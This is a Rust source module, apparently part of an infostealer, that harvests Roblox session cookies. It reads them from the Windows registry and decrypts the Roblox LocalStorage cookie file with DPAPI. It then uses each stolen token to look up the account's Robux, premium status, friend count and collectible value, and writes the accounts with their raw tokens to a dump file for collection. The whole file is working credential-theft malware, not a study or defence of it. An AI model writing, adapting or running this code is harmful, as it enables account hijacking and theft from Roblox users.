use std::path::{Path, PathBuf};
use std::fs;
use std::io::Read;
use std::collections::HashSet;

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[derive(serde::Deserialize)]
struct RobloxAuthUser {
    id: u64,
    name: String,
    #[serde(rename = "displayName")]
    display_name: String,
}

#[derive(serde::Deserialize)]
struct RobloxCurrency {
    robux: u64,
}

#[derive(serde::Deserialize)]
struct RobloxFriendCount {
    count: u64,
}

#[derive(serde::Deserialize)]
struct RobloxCollectible {
    #[serde(rename = "recentAveragePrice")]
    recent_average_price: Option<u64>,
}

#[derive(serde::Deserialize)]
struct RobloxCollectiblesResponse {
    data: Vec<RobloxCollectible>,
}

fn f_account_info(token: &str) -> Option<String> {
    let cookie_header = format!(".ROBLOSECURITY={}", token);
    
    let auth_res = ureq::get("https://users.roblox.com/v1/users/authenticated")
        .set("Cookie", &cookie_header)
        .call().ok()?;
        
    let auth_data: RobloxAuthUser = auth_res.into_json().ok()?;
    
    let currency_url = format!("https://economy.roblox.com/v1/users/{}/currency", auth_data.id);
    let mut robux = 0;
    if let Ok(curr_res) = ureq::get(&currency_url).set("Cookie", &cookie_header).call() {
        if let Ok(curr_data) = curr_res.into_json::<RobloxCurrency>() {
            robux = curr_data.robux;
        }
    }
    
    let premium_url = format!("https://premiumfeatures.roblox.com/v1/users/{}/validate", auth_data.id);
    let mut is_premium = false;
    if let Ok(prem_res) = ureq::get(&premium_url).set("Cookie", &cookie_header).call() {
         is_premium = prem_res.into_string().unwrap_or_default().to_lowercase().contains("true");
    }
    
    let friends_url = format!("https://friends.roblox.com/v1/users/{}/count", auth_data.id);
    let mut friend_count = 0;
    if let Ok(friends_res) = ureq::get(&friends_url).set("Cookie", &cookie_header).call() {
        if let Ok(friends_data) = friends_res.into_json::<RobloxFriendCount>() {
            friend_count = friends_data.count;
        }
    }

    let inventory_url = format!("https://inventory.roblox.com/v1/users/{}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100", auth_data.id);
    let mut total_rap = 0;
    if let Ok(inv_res) = ureq::get(&inventory_url).set("Cookie", &cookie_header).call() {
        if let Ok(inv_data) = inv_res.into_json::<RobloxCollectiblesResponse>() {
            for item in inv_data.data {
                if let Some(rap) = item.recent_average_price {
                    total_rap += rap;
                }
            }
        }
    }
    
    Some(format!(
        "Username: {} ({})\nID: {}\nRobux: {}\nPremium: {}\nFriends: {}\nTotal RAP: {}\nToken: {}\n",
        auth_data.display_name, auth_data.name, auth_data.id, robux, is_premium, friend_count, total_rap, token
    ))
}

pub fn extract(output_dir: &Path) -> usize {
    let mut count = 0;
    let mut tokens = HashSet::new();
    let roblox_dir = output_dir.join("GameSessions").join("Roblox");
    
    #[cfg(target_os = "windows")]
    {
        if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey("Software\\Roblox\\RobloxStudioBrowser\\roblox.com") {
            if let Ok(cookie) = hkcu.get_value::<String, _>(".ROBLOSECURITY") {
                if !cookie.is_empty() {
                    tokens.insert(cookie);
                }
            }
        }
    }

    if let Ok(local_app_data) = std::env::var("LOCALAPPDATA") {
        let storage_path = PathBuf::from(&local_app_data).join("Roblox").join("LocalStorage");
        if storage_path.exists() {
             if let Ok(entries) = fs::read_dir(&storage_path) {
                 for entry in entries.flatten() {
                      let path = entry.path();
                      if path.is_file() && path.file_name().unwrap_or_default() == "RobloxCookies.dat" {
                           if let Ok(mut file) = fs::File::open(&path) {
                               let mut content = String::new();
                               if file.read_to_string(&mut content).is_ok() {
                                   if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                                       if let Some(b64) = json.get("CookiesData").and_then(|v| v.as_str()) {
                                           if let Ok(encrypted_bytes) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64) {
                                                #[cfg(target_os = "windows")]
                                                if let Ok(decrypted) = kurion_crypto::dpapi::u_data(&encrypted_bytes) {
                                                     if let Ok(dec_str) = String::from_utf8(decrypted) {
                                                         if let Some(token) = e_token_from_blob(&dec_str) {
                                                             tokens.insert(token);
                                                         }
                                                     }
                                                }
                                           }
                                       }
                                   }
                               }
                           }
                      }
                 }
             }
        }
    }

    let mut account_dump = String::new();
    for token in tokens {
        if let Some(info) = f_account_info(&token) {
            account_dump.push_str(&info);
            account_dump.push_str("\n----------------------------------------\n\n");
            count += 1;
        } else {
            account_dump.push_str(&format!("Token (Dead or Invalid):\n{}\n\n----------------------------------------\n\n", token));
            count += 1;
        }
    }
    
    if count > 0 {
        fs::create_dir_all(&roblox_dir).ok();
        let _ = fs::write(roblox_dir.join("RobloxAccounts.txt"), account_dump);
    }

    count
}

fn e_token_from_blob(data: &str) -> Option<String> {
    if let Some(pos) = data.find(".ROBLOSECURITY") {
        if let Some(tab_pos) = data[pos..].find('\t') {
            let start = pos + tab_pos + 1;
            let token_part = &data[start..];
            if let Some(end) = token_part.find(|c| c == ';' || c == '\r' || c == '\n') {
                return Some(token_part[..end].to_string());
            } else {
                 return Some(token_part.to_string());
            }
        }
    }
    None
}
